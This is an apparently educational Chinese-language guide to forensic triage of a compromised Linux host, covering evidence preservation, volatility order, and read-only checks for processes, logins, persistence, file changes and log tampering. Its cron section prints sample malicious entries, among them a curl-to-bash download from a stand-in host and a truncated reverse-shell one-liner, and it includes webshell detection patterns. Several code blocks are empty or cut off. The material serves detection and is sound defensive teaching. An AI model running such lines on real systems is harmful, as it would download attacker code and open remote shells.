# 被入侵主機的跡證檢查

> [!danger] ★★★★★ 先讀這一段，再往下看
> 發現主機可能被入侵時，機關第一時間的反射動作是**重灌**。
> 那會在幾分鐘之內毀掉全部證據，讓你永遠不會知道：
> **入侵多久了？拿走了什麼？還有哪幾台也中了？**
>
> 重灌一台看起來很有效率，兩週後同一批人用同一個後門從第二台進來，
> 你會發現自己回到原點 —— 而這次連第一台的線索都沒有了。
>
> **四不一要：**
> - **不要重開機**（記憶體裡的證據會全部消失）
> - **不要重灌／不要還原快照**
> - **不要在受害機上大量操作**（覆寫證據，也可能觸發攻擊者的清除機制）
> - **不要刪除可疑檔案、不要 kill 可疑程序**
> - **要先隔離網路，但保持開機**

## 這篇你會學到

> [!abstract] 學習目標
> - 記住並能向主管解釋**黃金原則**與它背後的理由
> - 依**揮發性順序（order of volatility）**決定先收什麼、後收什麼
> - 對一台 Linux 主機跑完**七大類跡證檢查**：程序與連線、登入紀錄、帳號異動、
>   持久化機制、檔案異動、網路設定、日誌完整性
> - 用一支**唯讀的快速跡證收集腳本**在 10 分鐘內把現場拍下來
> - 判斷**什麼時候該停手交給專業**，並知道在那之前要保住什麼
> - 做到基本的**證據保全**：映像、雜湊、監管鏈紀錄

## 觀念說明

### 為什麼「重灌」是最貴的選項 ★★★★★

| 你以為 | 實際上 |
| --- | --- |
| 重灌最快，兩小時就恢復服務了 | 你不知道攻擊者怎麼進來的，**新機器會用同樣的方式再被打一次** |
| 反正資料有備份 | 備份裡可能已經包含 webshell 或後門（★★★★★ 入侵三個月，備份也中了三個月） |
| 只有這一台有問題 | 攻擊者橫向移動是常態；沒有調查就不知道還有哪幾台 |
| 沒有外洩，不用通報 | 「沒有外洩」是**你毀掉證據之後的猜測**，不是結論 |
| 反正查不出來 | 大部分入侵留下的痕跡比你想像的多，只是你得先**不要把它們洗掉** |

★★★★★ **一句話**：重灌解決的是「這台機器不能用」的問題，
不解決「我們被入侵了」的問題。而後者才是真正的問題。

### 揮發性順序（order of volatility）★★★★

證據會隨時間消失，消失得越快的越要先取。經典的排序（RFC 3227 的精神）：

```text
     消失最快
        ▲
        │  ① CPU 暫存器、快取                    幾乎不可能取得，忽略
        │  ② 記憶體內容（RAM）★★★★★           重開機就沒了
        │  ③ 網路連線狀態、執行中的程序 ★★★★★  程序結束就沒了
        │  ④ 執行中的程序開啟的檔案、路由表 ★★★★
        │  ⑤ 暫存檔（/tmp、/var/tmp、/dev/shm）★★★★  重開機可能被清
        │  ⑥ 磁碟上的檔案與日誌 ★★★
        │  ⑦ 遠端／集中日誌 ★★★               通常最安全
        │  ⑧ 實體設定、拓樸、備份 ★★
        ▼
     消失最慢
```

實務對照表：

| 動作 | 會毀掉哪一層 |
| --- | --- |
| **重開機** ★★★★★ | ②③④⑤ 全部消失，可能連 ⑥ 的部分也被開機腳本改掉 |
| **重灌** ★★★★★ | ②～⑥ 全部消失 |
| **還原快照／還原備份** ★★★★★ | 同重灌，而且會覆蓋掉磁碟原始狀態 |
| **`kill` 可疑程序** ★★★★★ | ③④，而且若執行檔已被刪除（`(deleted)`），連檔案本體都救不回來 |
| **`rm` 可疑檔案** ★★★★★ | ⑥，且失去雜湊與樣本 |
| **`apt install <工具>`** ★★★★ | 改動大量檔案時間戳，污染 ⑥ 的時間線 |
| **`find /` 全機掃描** ★★★★ | 改動大量 atime，污染時間線 |
| **拔網路線** ★★ | 只影響 ③ 中「正在進行」的連線（可接受，止血優先） |
| **`ps`、`ss`、`ls`（唯讀）** ★ | 幾乎不影響，可安全執行 |

★★★★★ **關鍵推論**：只要不重開機，你手上的證據就大多還在。
所以第一個決定永遠是：**隔離網路、保持開機。**

### 隔離的正確做法 ★★★★★

| 方法 | 保住記憶體？ | 止血效果 | 評價 |
| --- | --- | --- | --- |
| **在上游交換器／防火牆阻斷** ★★★★★ | ✅ 是 | 完全 | **最佳解**。受害機完全不知道自己被隔離了 |
| **實體拔網路線** ★★★★ | ✅ 是 | 完全 | 可以，但攻擊者的程式可能偵測到斷網而觸發清除 |
| **虛擬機層級斷開網卡** ★★★★ | ✅ 是 | 完全 | VM 環境的等效做法 |
| 在受害機上下防火牆規則 ★★ | ✅ 是 | 部分 | 需要在受害機上操作，且攻擊者若有 root 可以改回來 |
| **關機／重開機** ★ | ❌ **否** | 完全 | ★★★★★ 除非在止血，否則不要 |
| **拔電源** ★ | ❌ 否 | 完全 | 只有在「正在加密資料」時才考慮 |

> [!tip] ★★★★ 保留一條管理路徑
> 隔離時記得**保留你自己連得進去的路徑**（管理網段、iLO/iDRAC、VM console），
> 否則你會發現自己也進不去了，只好去機房 —— 那又浪費了寶貴的時間。

### 唯一的例外：正在流血的時候 ★★★★★

> [!danger] 止血優先於證據的三種情況
> 1. **資料正在被外傳**（看到持續的大量 outbound 流量）
> 2. **檔案正在被加密**（勒索軟體正在跑）
> 3. **這台機器正在攻擊其他主機**（成為跳板）
>
> 這三種情況下，**先阻止傷害擴大**，證據其次。
> 但即使如此，**優先選「上游阻斷」而不是關機** —— 上游阻斷同樣能止血，
> 而且保住記憶體。只有在上游阻斷來不及、或攻擊發生在本機（勒索加密）時，
> 才考慮強制關機。
>
> ★★★★ 如果真的必須關機：**拔電源**優於正常關機。
> 正常關機會執行關機腳本、清空 `/tmp`、同步寫入磁碟，
> 可能覆蓋掉未分配空間裡的證據。（代價是檔案系統可能需要 fsck。）

### 判讀的三個難處 ★★★★

在你開始逐項檢查之前，要先有心理準備：

#### 難處一：正常的東西看起來也很可疑 ★★★★

```text
[kworker/2:1-events]     ← 核心執行緒，完全正常
/usr/sbin/irqbalance     ← 正常
/usr/lib/snapd/snapd     ← 正常
python3 /opt/monitor.py  ← 是你們自己的監控？還是別人的？
```

★★★★ 在一台你不熟的主機上，你分不出哪個是正常的。
第一次看 `ps aux` 的人幾乎一定會覺得「這些我都不認識，是不是都有問題」。

#### 難處二：入侵者會刻意偽裝成正常 ★★★★★

| 偽裝手法 | 例子 | 怎麼識破 |
| --- | --- | --- |
| 程序名稱取得像系統程序 | `[kworker/0:2]`（真的核心執行緒沒有可執行檔） | ★★★★★ 看 `/proc/<pid>/exe` |
| 放在系統目錄下 | `/usr/lib/systemd/systemd-udevd2` | 用套件驗證（`debsums`／`rpm -Va`） |
| 檔名只差一個字 | `sshd` vs `sshd `（結尾空白）、`crond` vs `cr0nd` | `ls -b` 顯示跳脫字元 |
| 時間戳被改成跟鄰居一樣 | `touch -r /bin/ls /tmp/evil` | ★★★★★ 看 `ctime`（`touch` 改不掉） |
| 藏在隱藏目錄 | `/var/tmp/.systemd-private-xxx/` | `find -name '.*'` |
| 用合法工具做壞事 | 用 `curl`、`ssh`、`tar` 外傳資料（LOLBins） | 看行為與時間，不是看工具 |

#### 難處三：沒有基線就無法判斷什麼是異常 ★★★★★

這是最根本的困難。「這台機器上有 143 個 setuid 檔案」——
**多還是少？正常還是異常？** 沒有基線你答不出來。

有基線的話，問題變成「這台機器上的 setuid 檔案比一個月前**多了 1 個**」——
這就是一個可以立刻追查的具體發現。

| 基線種類 | 怎麼建 | 事後救急替代方案 |
| --- | --- | --- |
| **套件檔案完整性** ★★★★★ | 系統本身就有（`debsums`／`rpm -Va`） | 直接可用，**這是最容易取得的基線** |
| **檔案完整性（FIM）** ★★★★★ | AIDE、Wazuh FIM | 拿同版本、同角色的另一台主機比對 |
| **正常的程序清單** ★★★★ | 平時存一份 `ps -eo ...` | 跟同角色的主機比對 |
| **正常的監聽埠** ★★★★ | 平時存一份 `ss -tlnp` | 跟同角色的主機比對 |
| **正常的帳號清單** ★★★★ | 平時存一份 `getent passwd` | 跟安裝當時的紀錄比對 |
| **全機檔案雜湊** ★★★ | 見 [[090-07-14-guide-資安實踐-資安情資研判與IoC比對]] | 無 |

★★★★★ **拿同版本、同角色的另一台主機來比對**，是沒有基線時最實用的替代方案。
兩台 web01／web02 裝法一樣，`diff` 一下就知道多了什麼。

## 安裝或基礎操作

### 動手前的準備 ★★★★★

#### 1. 從外部帶工具進去，不要在受害機上安裝

> [!danger] ★★★★★ 不要在受害機上 `apt install`
> 三個理由：
> 1. 需要對外連線，而你剛剛才把它隔離
> 2. 會改動大量檔案的時間戳，污染時間線
> 3. 受害機上的套件管理員本身可能已被動過手腳

準備一支 USB 或一個唯讀掛載的 NFS，裡面放靜態連結的工具與收集腳本：

```bash
# 在「乾淨的」機器上準備
mkdir -p /media/ir-toolkit/bin
cp /usr/bin/{sha256sum,find,ps,ss,lsof,stat,file,strings} /media/ir-toolkit/bin/ 2>/dev/null
# 檢查是否為靜態連結（動態連結的工具仍會用到受害機的 libc，效果打折）
file /media/ir-toolkit/bin/ps
```

★★★ 更嚴謹的做法是準備一套靜態編譯的 busybox：

```bash
# busybox 靜態版本可以取代大部分基本工具，且不依賴受害機的函式庫
/media/ir-toolkit/bin/busybox ps
/media/ir-toolkit/bin/busybox ls -la /tmp
```

#### 2. 輸出寫到外部媒體，不要寫回受害機 ★★★★★

```bash
# 掛載外部媒體（唯讀掛載受害機的東西、可寫掛載你的收集碟）
sudo mkdir -p /mnt/evidence
sudo mount /dev/sdb1 /mnt/evidence
```

> [!warning] ★★★★ 寫回受害機的三個壞處
> 1. 佔用磁碟空間，可能覆蓋掉未分配區域裡的已刪除檔案殘跡
> 2. 你的輸出檔本身會污染時間線
> 3. 如果之後要做磁碟映像，你的檔案也會被一起映像進去

#### 3. 用專用帳號，不要用日常帳號 ★★★★

> [!danger] ★★★★ 受害機上可能有鍵盤側錄或憑證竊取
> 用你平常的管理帳號登入受害機，等於把那組憑證交給攻擊者。
> 建立一個**臨時的調查用帳號**（或用 console 直接以 root 操作），
> 調查結束後立刻停用，並把所有曾經登入過該機的帳號密碼／金鑰輪替。

#### 4. 記錄你自己做的每一件事 ★★★★★

```bash
# 用 script 全程錄影（在你自己的機器上錄，不要錄到受害機的磁碟）
script -a -f /mnt/evidence/session-$(date +%Y%m%d-%H%M%S).log
```

★★★★★ 這份紀錄有兩個用途：
① 之後專業人員可以知道**哪些改動是你造成的**（不然他們會把你的操作當成攻擊者的）；
② 監管鏈的一部分。

### 收集的順序 ★★★★★

嚴格照揮發性順序來：

| 順序 | 收什麼 | 大概耗時 | 備註 |
| --- | --- | --- | --- |
| 0 | **隔離網路（上游）** | 1 分鐘 | 先做這個 |
| 1 | 記憶體傾印（如果做得到） | 10～30 分鐘 | ★★★ 需要事先準備工具，見下 |
| 2 | 執行中的程序、網路連線、開啟的檔案 | 2 分鐘 | ★★★★★ 一定要做 |
| 3 | 登入紀錄、帳號狀態 | 2 分鐘 | ★★★★★ |
| 4 | 持久化機制（cron、systemd、金鑰） | 5 分鐘 | ★★★★★ |
| 5 | 檔案異動與完整性驗證 | 10～30 分鐘 | ★★★★ |
| 6 | 網路設定、防火牆規則 | 2 分鐘 | ★★★ |
| 7 | 日誌打包 | 5 分鐘 | ★★★★ |
| 8 | 磁碟映像（若要） | 數小時 | ★★★ 通常交給專業 |

★★★★ 步驟 2～7 就是下面那支腳本做的事，**10 分鐘內可以跑完**。

### 記憶體傾印 ★★★

> [!warning] ★★★ 記憶體傾印需要事先準備
> Linux 上做記憶體傾印通常需要載入核心模組（如 LiME），
> 而**載入模組本身就會改變記憶體內容**，且需要對應核心版本編譯。
> 如果沒有事先準備，多數機關做不到這一步 —— 這是可以接受的。
>
> 折衷做法：至少把**程序的記憶體對映與命令列**收下來（下面腳本有做），
> 以及對可疑程序做單一程序的記憶體擷取。

```bash
# 單一可疑程序的記憶體區段列表（唯讀，安全）
sudo cat /proc/<pid>/maps > /mnt/evidence/pid<pid>-maps.txt

# 已刪除但仍在執行的執行檔，可以從 /proc 救回來 ★★★★★
sudo cp /proc/<pid>/exe /mnt/evidence/recovered-<pid>.bin
sudo sha256sum /mnt/evidence/recovered-<pid>.bin
```

★★★★★ **最後這招極為重要**：攻擊者常把執行檔刪掉只留記憶體中的行程
（`/proc/<pid>/exe -> ... (deleted)`）。
只要**程序還活著**，`cp /proc/<pid>/exe` 就能把檔案完整救回來。
一旦你 `kill` 掉它，或機器重開機，這個檔案就永遠消失了。

## 進階應用

以下七大類，就是一台 Linux 主機的完整跡證檢查清單。
**每一項都是唯讀操作**，可以安全地在保持開機的受害機上執行。

### 一、執行中的程序與網路連線 ★★★★★

#### 基本盤點

```bash
ps auxww
ps -eo pid,ppid,uid,user,lstart,etime,comm,args --sort=start_time
ps auxf        # 樹狀，看父子關係
```

★★★★★ `lstart` 欄位（程序啟動的絕對時間）是判斷入侵時間的重要線索。

預期輸出（節錄，可疑的部分）：

```text
  PID  PPID   UID USER      STARTED                ELAPSED COMMAND
 1102     1     0 root      Mon Jun 10 09:12:03 2026  85-06:10 nginx
 2841  1102    33 www-data  Wed Jun 18 21:47:19 2026  76-17:35 sh
31882  2841     0 root      Wed Jun 18 21:49:02 2026  76-17:33 sshd
```

判讀 ★★★★★：
- `sh` 的父行程是 `nginx`，UID 33（www-data）→ **Web 服務生出 shell**，典型的 RCE 結果
- `sshd` 的父行程是那個 `sh`，而且 **UID 已經是 0** → 已提權
- 啟動時間 6/18 21:47 → 入侵至少 76 天

#### 程序名稱偽裝的識破 ★★★★★

```bash
# 列出所有程序的真實執行檔路徑
sudo ls -l /proc/*/exe 2>/dev/null
```

```bash
# 只挑出「不在標準目錄」或「已刪除」的 —— 高度可疑
sudo ls -l /proc/*/exe 2>/dev/null \
  | grep -E '\(deleted\)|-> /(tmp|var/tmp|dev/shm|home)/'
```

預期輸出：

```text
lrwxrwxrwx 1 root root 0 Sep  3 15:12 /proc/31882/exe -> /tmp/.ICE-unix/sshd (deleted)
```

★★★★★ 兩個紅旗：路徑在 `/tmp`、標記 `(deleted)`。

```bash
# 對每個可疑 PID 收完整資訊
for p in 2841 31882; do
  echo "=== PID $p ==="
  sudo ls -l /proc/$p/exe /proc/$p/cwd /proc/$p/root 2>/dev/null
  sudo tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
  sudo cat /proc/$p/status 2>/dev/null | grep -E '^(Name|Uid|Gid|PPid|TracerPid)'
  sudo tr '\0' '\n' < /proc/$p/environ 2>/dev/null | head -20
  sudo ls -l /proc/$p/fd 2>/dev/null | head -20
done
```

★★★★ `environ`（環境變數）常常洩漏攻擊者的意圖，例如 `LD_PRELOAD=/lib/x.so`
或 C2 位址。

#### 核心執行緒 vs 偽裝 ★★★★★

真正的核心執行緒（名稱有方括號，如 `[kworker/0:1]`）**沒有可執行檔**：

```bash
# 真核心執行緒：readlink 會失敗
sudo readlink /proc/12/exe        # 無輸出或 No such file
# 偽裝成核心執行緒的使用者行程：readlink 會有值 ★★★★★
sudo readlink /proc/31882/exe
```

```bash
# 一次找出所有「名字像核心執行緒、卻有執行檔」的行程
for p in /proc/[0-9]*; do
  pid=${p##*/}
  name=$(cat "$p/comm" 2>/dev/null)
  exe=$(sudo readlink "$p/exe" 2>/dev/null)
  if [[ "$name" == *"kworker"* || "$name" == *"kthread"* ]] && [[ -n "$exe" ]]; then
    echo "★★★★★ 可疑：PID $pid comm=$name exe=$exe"
  fi
done
```

### 二、登入紀錄 ★★★★★

```bash
last -F -a          # 成功登入（讀 /var/log/wtmp）
last -F -x          # 含開關機與 runlevel 紀錄 ★★★★
lastb -F            # 失敗登入（讀 /var/log/btmp）
lastlog             # 每個帳號最後一次登入
who -a              # 目前線上
w                   # 目前線上與在做什麼
```

判讀重點：

| 看什麼 | 為什麼可疑 |
| --- | --- |
| **非上班時段的成功登入** ★★★★★ | 凌晨兩三點的登入幾乎不可能是正常維運 |
| **陌生來源 IP／境外 IP** ★★★★★ | 對照你的管理網段白名單 |
| **服務帳號登入** ★★★★★ | `www-data`、`deploy`、`backup` 不該有互動登入 |
| **大量失敗後接一次成功** ★★★★ | 暴力破解成功的典型形態 |
| **`still logged in` 但沒人在** ★★★★ | 可能是攻擊者的持續連線 |
| **`last -x` 顯示的開機時間跟你認知不符** ★★★★ | 有人重開過機（可能就是攻擊者） |

```bash
# 非上班時段（00:00-06:00）的成功登入
sudo zgrep 'Accepted' /var/log/auth.log* 2>/dev/null \
  | awk '{split($3,t,":"); if (t[1]+0 < 6) print}'

# 服務帳號的登入
sudo zgrep -E 'Accepted .* for (www-data|deploy|backup|nobody|postgres|mysql|git) ' \
  /var/log/auth.log* 2>/dev/null

# 新增的 SSH 公鑰認證來源
sudo zgrep 'Accepted publickey' /var/log/auth.log* 2>/dev/null \
  | awk '{print $(NF-3), $(NF-1), $NF}' | sort | uniq -c | sort -rn
```

> 認證日誌在 `/var/log/secure`：
> ```bash
> sudo zgrep 'Accepted' /var/log/secure*
> sudo journalctl -u sshd --no-pager | grep Accepted
> ```
> RHEL 系預設有 `auditd`，能查到更精細的紀錄：

#### `wtmp` 被清掉的跡象 ★★★★★

攻擊者常用工具把自己的登入紀錄從 `wtmp`／`utmp`／`btmp` 裡挖掉。
這些是二進位檔，挖掉之後會留下痕跡：

```bash
# ① 檢查檔案大小是不是「剛剛好」是記錄大小的整數倍（正常應該是）
stat -c '%s %n' /var/log/wtmp /var/log/btmp /var/run/utmp
```

```bash
# ② 用 utmpdump 轉成文字，看時間序有沒有斷層或倒退 ★★★★★
sudo utmpdump /var/log/wtmp | tail -50
```

預期輸出（節錄）：

```text
[7] [02841] [ts/1] [deploy  ] [pts/1  ] [203.0.113.45  ] [203.0.113.45] [2026-06-18T21:49:02,000000+0800]
[8] [02841] [ts/1] [        ] [pts/1  ] [              ] [0.0.0.0    ] [2026-06-18T22:31:17,000000+0800]
```

★★★★★ 判讀被竄改的三個跡象：
1. **時間倒退**（第 N 筆的時間比第 N+1 筆晚）—— 幾乎必然是被編輯過
2. **時間出現大段空白**（例如整整一天完全沒有任何紀錄，包含 reboot）
3. **檔案大小不是 384 位元組的整數倍**（x86_64 上 `utmp` 結構的大小），
   表示被非正規手段截斷 ★★★★

```bash
# 檢查是否為結構大小的整數倍
sz=$(stat -c %s /var/log/wtmp); echo "size=$sz  remainder=$((sz % 384))"
```

★★★ 餘數不為 0 ＝ 高度可疑。（結構大小依平台可能不同，比對同架構的其他主機更可靠。）

```bash
# ③ 檔案的 mtime 跟最後一筆紀錄的時間差很多，也很可疑
stat -c '%y %n' /var/log/wtmp
sudo utmpdump /var/log/wtmp | tail -1
```


★★★★ 重點是：**服務帳號（`www-data`、`nobody`）不該有可用的密碼雜湊**。

```bash
# 帳號檔案的時間戳 ★★★★★
stat /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/sudoers
```

預期輸出（節錄）：

```text
  File: /etc/shadow
Modify: 2026-06-18 21:51:44.328117622 +0800
Change: 2026-06-18 21:51:44.328117622 +0800
```

★★★★★ **如果你近期沒有新增或改過帳號，`/etc/shadow` 的 mtime 卻是三個月前的某個凌晨，
那就是有人動過。** 而且這個時間點通常就是入侵時間。

> [!tip] ★★★★★ ctime 是 `touch` 改不掉的
> `touch -d` 或 `touch -r` 可以偽造 `atime` 與 `mtime`，**但改不了 `ctime`**
> （inode 變更時間）—— 因為 `touch` 本身就會更新 `ctime`。
> 所以 **`mtime` 很舊但 `ctime` 很新的檔案，就是時間戳被偽造過的證據。**
> ```bash
> # 找 mtime 遠早於 ctime 的檔案
> sudo find /etc /usr/bin /usr/sbin -xdev -type f -newerct '90 days ago' \
>      ! -newermt '90 days ago' -ls 2>/dev/null
> ```

```bash
# sudo 權限異動
sudo cat /etc/sudoers
sudo ls -la /etc/sudoers.d/
sudo grep -rn 'NOPASSWD' /etc/sudoers /etc/sudoers.d/ 2>/dev/null
```

★★★★★ `/etc/sudoers.d/` 底下多出來的檔案是常見的提權持久化手法。

```bash
# 特權群組成員
getent group sudo wheel adm docker lxd
```

★★★★★ `docker` 與 `lxd` 群組成員**等同 root**（可以掛載宿主檔案系統），
攻擊者很愛把自己加進去。

### 四、持久化機制 ★★★★★

攻擊者要在重開機之後還能回來，就必須在某處留下自動執行的設定。
這是**最有價值的檢查項目** —— 找到持久化就找到了具體證據。

#### cron ★★★★★

```bash
# 各使用者的 crontab
for u in $(cut -d: -f1 /etc/passwd); do
  out=$(sudo crontab -l -u "$u" 2>/dev/null)
  [[ -n "$out" ]] && { echo "=== $u ==="; echo "$out"; }
done
```

```bash
# 系統層 cron
sudo cat /etc/crontab
sudo ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
sudo cat /etc/cron.d/* 2>/dev/null
sudo ls -la /var/spool/cron/crontabs/ 2>/dev/null      # Debian/Ubuntu
sudo ls -la /var/spool/cron/ 2>/dev/null               # RHEL
```

可疑樣態 ★★★★★：

```text
*/5 * * * * root curl -s http://cdn-update.example.net/s | bash
@reboot www-data /tmp/.ICE-unix/sshd
* * * * * root /usr/bin/python3 -c "import socket,subprocess,os;..."
```

三個特徵：**下載後直接執行**、**指向 `/tmp` 的執行檔**、**內嵌 reverse shell**。

#### systemd ★★★★★

```bash
# 已啟用的 unit
systemctl list-unit-files --state=enabled --no-pager
systemctl list-units --type=service --state=running --no-pager

# ★★★★★ 最近建立或修改的 unit 檔案
sudo find /etc/systemd /usr/lib/systemd /lib/systemd /run/systemd \
     -name '*.service' -o -name '*.timer' -o -name '*.socket' 2>/dev/null \
  | xargs -r ls -lt 2>/dev/null | head -30
```

```bash
# systemd timer（現代版的 cron，很多人不會去看）★★★★★
systemctl list-timers --all --no-pager
```

```bash
# 使用者層級的 systemd unit（★★★★ 極易被忽略）
sudo ls -la /home/*/.config/systemd/user/ 2>/dev/null
sudo ls -la /root/.config/systemd/user/ 2>/dev/null
loginctl list-users
```

★★★★★ **使用者層級的 unit + `loginctl enable-linger`** 是一種很隱蔽的持久化：
即使使用者沒有登入，服務也會一直跑，而且不會出現在系統層的 `systemctl` 清單裡。

```bash
# 檢查 linger 設定
ls -la /var/lib/systemd/linger/ 2>/dev/null
```

#### shell 設定檔 ★★★★

```bash
sudo ls -la /etc/profile /etc/profile.d/ /etc/bash.bashrc /etc/bashrc 2>/dev/null
sudo cat /etc/profile.d/*.sh 2>/dev/null | head -60

for h in /root /home/*; do
  for f in .bashrc .bash_profile .profile .bash_logout .zshrc .zprofile; do
    [[ -f "$h/$f" ]] && { echo "=== $h/$f ($(stat -c %y "$h/$f" | cut -d. -f1)) ==="; tail -20 "$h/$f"; }
  done
done
```

★★★★★ 惡意內容通常加在**檔案最後幾行**，所以用 `tail`。
也要注意 `.bash_logout`（登出時執行，用來清除痕跡）。

#### SSH 金鑰 ★★★★★

```bash
sudo ls -la /root/.ssh/ /home/*/.ssh/ 2>/dev/null
sudo cat /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null
```

★★★★★ **`authorized_keys` 裡多出來的一行公鑰，就是一個完整的後門。**
逐行檢查每一把金鑰的註解（結尾的 `user@host`），不認得的就是問題。

```bash
# 金鑰檔的時間戳
sudo stat /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null \
  | grep -E 'File:|Modify:'

# sshd 設定是否被動過（例如開啟 PermitRootLogin、加了 AuthorizedKeysFile）
sudo sshd -T 2>/dev/null | grep -iE 'permitrootlogin|passwordauth|authorizedkeysfile|permittunnel|allowtcpforwarding'
sudo ls -la /etc/ssh/sshd_config /etc/ssh/sshd_config.d/ 2>/dev/null
```

★★★★ `sshd -T` 印出的是**實際生效的設定**（包含 `Include` 進來的），
比直接讀 `sshd_config` 可靠。詳見 [[020-02-01-07-svc-SSH-安全強化]]。

#### 動態連結庫劫持 ★★★★★

```bash
# LD_PRELOAD 型的 rootkit
sudo cat /etc/ld.so.preload 2>/dev/null
sudo ls -la /etc/ld.so.preload 2>/dev/null
sudo cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null
```

★★★★★ **`/etc/ld.so.preload` 這個檔案在絕大多數系統上根本不該存在。**
它一旦存在，裡面列的 `.so` 會被載入到**每一個**動態連結的程式裡 ——
這就是為什麼 `ls`、`ps`、`netstat` 可以被騙得看不到攻擊者的檔案與程序。

```bash
# 環境變數層級的
sudo grep -rn 'LD_PRELOAD\|LD_LIBRARY_PATH' /etc/environment /etc/profile /etc/profile.d/ \
     /root/.bashrc /home/*/.bashrc 2>/dev/null
```

#### 核心模組 ★★★★★

```bash
lsmod
sudo cat /proc/modules
```

```bash
# 比對已載入的模組是否來自套件（Debian/Ubuntu）★★★★
for m in $(lsmod | awk 'NR>1{print $1}'); do

```

★★★★★ **不屬於任何套件、或找不到對應檔案的核心模組** 是 rootkit 的強烈指標。


### 五、檔案異動 ★★★★★

#### 用套件管理員驗證系統檔完整性 ★★★★★

這是**最容易取得、也最有力的基線**。系統套件安裝時就記錄了每個檔案的雜湊。

```bash
# Debian / Ubuntu
sudo apt install -y debsums     # ★★★★ 注意：受害機上不要裝！在乾淨機上先裝好
sudo debsums -c                 # 只列出校驗失敗的檔案
sudo debsums -ca                # 含設定檔一起檢查
sudo debsums -l                 # 列出「沒有校驗資料」的套件
```

預期輸出（有問題時）：

```text
/usr/bin/ss
/bin/ps
/usr/sbin/sshd
```

★★★★★ `ps`、`ss`、`ls`、`netstat`、`sshd` 校驗失敗 = **系統二進位檔被替換**
= 你剛剛跑的所有 `ps`／`ss` 輸出都不可信。這時候必須用外部工具重跑。

> [!info]- Rocky / AlmaLinux（RHEL 系）對照
> RHEL 系內建 `rpm -V`，**不需要額外安裝任何東西**，這是很大的優勢：
> ```bash
> sudo rpm -Va                       # 驗證所有套件
> sudo rpm -Va --nomtime --nomode    # 忽略時間與權限差異，只看內容
> sudo rpm -V coreutils procps-ng openssh-server
> ```
> 輸出的旗標意義：
> ```text
> S.5....T.  c /etc/ssh/sshd_config
> ││││││││
> │││││││└─ T = mtime 不同
> ││││││└── U/G = 擁有者/群組不同
> │└─────── 5 = ★★★★★ MD5 雜湊不同（內容被改）
> └──────── S = 檔案大小不同
> 開頭的 c = 這是設定檔（被改屬正常）
> ```
> ★★★★★ **看到 `5` 出現在非設定檔（沒有 `c` 標記）的行上，就是嚴重問題。**

```bash

while read -r sum path; do
  actual=$(md5sum "/$path" 2>/dev/null | cut -d' ' -f1)
  [[ "$actual" != "$sum" ]] && echo "★★★★★ MISMATCH: /$path"
done < "/var/lib/dpkg/info/${pkg}.md5sums"
```

#### 最近修改的檔案 ★★★★★

```bash
# 系統目錄下最近 30 天內修改過的檔案

     -xdev -type f -mtime -30 -ls 2>/dev/null | sort -k8
```

```bash
# 指定時間區間（已知入侵時間時最有用）★★★★★
sudo find / -xdev -type f \
     -newermt '2026-06-18 20:00' ! -newermt '2026-06-19 06:00' \
     ! -path '/proc/*' ! -path '/sys/*' -ls 2>/dev/null
```

★★★★★ 這一條是**時間線分析的核心**：一旦你從日誌或程序啟動時間知道了入侵時刻，
就用它把那個時段所有被建立或修改的檔案撈出來 —— 那就是攻擊者的足跡。

```bash
# 依 ctime 找（★★★★★ ctime 無法偽造）
sudo find / -xdev -type f -ctime -30 \
     ! -path '/proc/*' ! -path '/sys/*' ! -path '/var/log/*' -ls 2>/dev/null | head -50
```

```bash
# 世界可寫目錄裡的執行檔
sudo find /tmp /var/tmp /dev/shm -xdev -type f -ls 2>/dev/null
sudo find /tmp /var/tmp /dev/shm -xdev -type f -perm -u+x -ls 2>/dev/null
```

★★★★★ **`/dev/shm` 裡不該有任何持久檔案。**

```bash
# 隱藏檔案與目錄
sudo find /tmp /var/tmp /dev/shm /home /root /var/www -xdev -name '.*' -ls 2>/dev/null | head -40
```

```bash
# setuid / setgid 檔案（跟基線或同角色主機比對）★★★★★
sudo find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -ls 2>/dev/null | sort -k11
```

```bash
# Web 目錄裡不該有的東西 ★★★★★
sudo find /var/www -xdev -name '*.php' -newermt '30 days ago' -ls 2>/dev/null
sudo find /var/www -xdev -path '*upload*' -name '*.php' -ls 2>/dev/null
sudo find /var/www -xdev -type f -user www-data -name '*.php' -ls 2>/dev/null
```

★★★★★ 最後一條：**擁有者是 `www-data` 的 PHP 檔** ——
正常部署的檔案擁有者應該是部署帳號，不是 Web 服務本身。
擁有者是 `www-data` 代表這個檔是**由 Web 程序自己寫出來的**，
在絕大多數情況下就是 webshell。

```bash
# webshell 常見特徵字串
sudo grep -rIl --include='*.php' -E \
  'eval\(|base64_decode\(|shell_exec\(|passthru\(|assert\(|\$_(POST|GET|REQUEST)\[' \
  /var/www 2>/dev/null | head -30
```

★★★ 這會有誤判（正常框架也用 `base64_decode`），要人工看過。
但配合「檔案很新」「擁有者是 www-data」兩個條件，準確度會高很多。

### 七、日誌被清除或斷檔的跡象 ★★★★★

攻擊者清日誌，本身就是最強的入侵證據之一。

```bash
# ① 日誌檔大小異常為 0 或極小
```

★★★★★ `journalctl --verify` 會驗證 journal 檔的內部雜湊鏈。
輸出 `FAIL` 表示檔案被竄改或損毀。

```bash
# ③ 日誌的時間連續性 —— 找出「整段消失」的時間 ★★★★★
```

```text
    398 Jun 17
      2 Jun 18          ← ★★★★★ 這一天只有 2 筆，明顯被清過
    405 Jun 19
```

```bash

```


★★★★★ 看到 `Storage=none` 或 rsyslog 的規則被註解掉，就是有人刻意讓系統不記錄。

```bash
# ⑥ shell 歷史紀錄

sudo tail -50 /root/.bash_history 2>/dev/null
```

判讀 ★★★★★：

| 現象 | 意義 |
| --- | --- |
| `.bash_history` 大小為 0 | 被清空 |
| `.bash_history` 是 symlink 指向 `/dev/null` ★★★★★ | 刻意停用歷史紀錄，**這絕不是正常設定** |
| `HISTFILE=` 或 `unset HISTFILE` 出現在 rc 檔 ★★★★★ | 同上 |
| 歷史紀錄裡有 `curl ... \| bash`、`wget`、`chmod +x` ★★★★ | 攻擊者忘了清 |
| 歷史紀錄最後修改時間比最後登入早很多 | 有人登入過但沒留下歷史 |

```bash
# 檢查 history 是否被停用

